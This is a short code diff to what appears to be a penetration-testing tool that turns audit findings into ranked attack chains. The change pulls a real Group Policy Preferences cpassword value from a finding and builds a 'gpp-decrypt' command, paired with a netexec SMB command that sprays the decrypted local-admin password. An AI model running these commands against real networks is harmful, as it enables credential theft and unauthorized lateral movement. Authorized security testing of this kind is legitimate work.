@@ -554,9 +554,22 @@ def run(report, store, ui=None):
     # not (MS14-025 prompted mass rotations of GPP-pushed local-admin pws).
     if e.has_gpp:
         s, l = e.gpp_src
+        # iter-73: extract the actual cpassword blob from the finding hint
+        # so the emitted command carries the real base64 value the operator
+        # would otherwise have to copy manually. Undecrypted GPP findings
+        # are surfaced under cat='GPP cpassword' with a 'gpp-decrypt <blob>'
+        # hint; decrypted ones land under CRED PAIRS (no R13 needed).
+        _cpw_blob = "<cpassword-value>"
+        for _f in report.findings:
+            if _f.get("category") == "GPP cpassword" and _f.get("file") == s:
+                _hint = _f.get("hint") or ""
+                _m = re.search(r"gpp-decrypt\s+'([^']+)'", _hint)
+                if _m:
+                    _cpw_blob = _m.group(1)
+                    break
         chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public AES key)",
             crit=7, conf=0.9, ready=1.5, prox=0.85,        # score 8.04
-            commands=["gpp-decrypt '<cpassword-value>'",
+            commands=[f"gpp-decrypt '{_cpw_blob}'",
                       f"netexec smb {dc()} -u '<user>' -p '<decrypted>' --local-auth --continue-on-success"],
             src=s, line=l))
     # private key
